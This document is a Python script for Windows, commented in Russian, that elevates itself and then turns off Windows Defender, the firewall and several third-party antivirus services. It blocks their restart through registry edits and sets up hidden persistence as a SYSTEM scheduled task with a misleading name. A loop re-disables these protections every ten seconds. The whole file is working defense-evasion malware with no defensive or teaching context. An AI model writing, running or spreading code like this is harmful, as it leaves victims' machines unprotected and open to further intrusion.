

`python
import os
import sys
import subprocess
import winreg
import ctypes
import time

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# Отключение Windows Defender (через реестр)
def disable_defender():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except FileNotFoundError:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender")
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)

# Отключение брандмауэра
def disable_firewall():
    os.system('netsh advfirewall set allprofiles state off')

# Отключение служб антивирусов (примеры)
def disable_antivirus_services():
    services = [
        "WinDefend",  # Windows Defender
        "Kaspersky Anti-Virus",
        "Avast Antivirus",
        "Norton Antivirus",
        "McAfee McShield",
        "ESET Service"
    ]
    for service in services:
        os.system(f'sc stop "{service}" 2>nul')
        os.system(f'sc config "{service}" start=disabled 2>nul')

# Блокировка включения (через реестр и групповые политики)
def block_antivirus_enable():
    # Запрет на запуск Defender
    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection")
    winreg.SetValueEx(key, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)

    # Блокировка восстановления служб
    os.system('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend" /v Start /t REG_DWORD /d 4 /f')
    os.system('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\MpsSvc" /v Start /t REG_DWORD /d 4 /f')  # брандмауэр

# Автозагрузка через планировщик
def add_to_task_scheduler():
    script_path = os.path.abspath(sys.argv[0])
    task_name = "SystemProtectionUpdater"
    # Создаем задачу с максимальными правами
    command = f'schtasks /create /tn "{task_name}" /tr "pythonw.exe {script_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
    os.system(command)

# Скрытие окна (если запущен через pythonw.exe)
if sys.argv[0].endswith('.py'):
    # Перезапуск через pythonw.exe
    subprocess.Popen(['pythonw.exe', __file__], creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit()

# Основной цикл
if __name__ == "__main__":
    disable_defender()
    disable_firewall()
    disable_antivirus_services()
    block_antivirus_enable()
    add_to_task_scheduler()

    # Постоянный мониторинг и блокировка (каждые 10 секунд)
    while True:
        disable_defender()
        disable_firewall()
        time.sleep(10)
`